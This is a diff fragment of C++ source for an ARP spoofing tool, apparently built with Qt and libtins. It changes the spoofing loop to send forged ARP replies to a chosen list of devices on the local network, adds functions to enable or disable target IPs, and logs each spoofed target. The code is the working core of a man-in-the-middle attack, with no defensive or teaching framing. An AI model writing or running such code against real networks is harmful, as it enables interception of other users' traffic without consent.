@@ -18,10 +18,8 @@ void ArpSpoofing::doSpoofing()
 
     EthernetII::address_type gateway_hw = Utils::resolve_hwaddr(m_interface, m_gatewayIp, sender);
 
-    std::vector<IPv4Address> iplist;
-
-    // foreach device on network
-    foreach(IPv4Address target_ip, iplist)
+    // Foreach device on network
+    foreach(IPv4Address target_ip, m_iplist.keys())
     {
         EthernetII::address_type target_hw = Utils::resolve_hwaddr(m_interface, target_ip, sender);
 
@@ -46,17 +44,29 @@ void ArpSpoofing::doSpoofing()
         EthernetII to_tg = EthernetII(target_hw, nifinfo.hw_addr) / tg_arp;
 
         sender.send(to_tg, m_interface);
+
+        qDebug() << "SPOOF" << target_ip.to_string().data() << m_gatewayIp.to_string().data();
     }
+}
+
+void ArpSpoofing::enableIp(Tins::IPv4Address ip, bool enabled)
+{
+  m_iplist[ip] = enabled;
+}
+
+void ArpSpoofing::enableIp(QString ip, bool enabled)
+{
+  enableIp(Tins::IPv4Address(ip.toLocal8Bit().data()), enabled);
 }
 
 Tins::IPv4Address ArpSpoofing::gatewayIp() const
 {
-    return m_gatewayIp;
+  return m_gatewayIp;
 }
 
 void ArpSpoofing::setGatewayIp(const Tins::IPv4Address &gateway_ip)
 {
-    m_gatewayIp = gateway_ip;
+  m_gatewayIp = gateway_ip;
 }
 
 Tins::NetworkInterface ArpSpoofing::interface() const
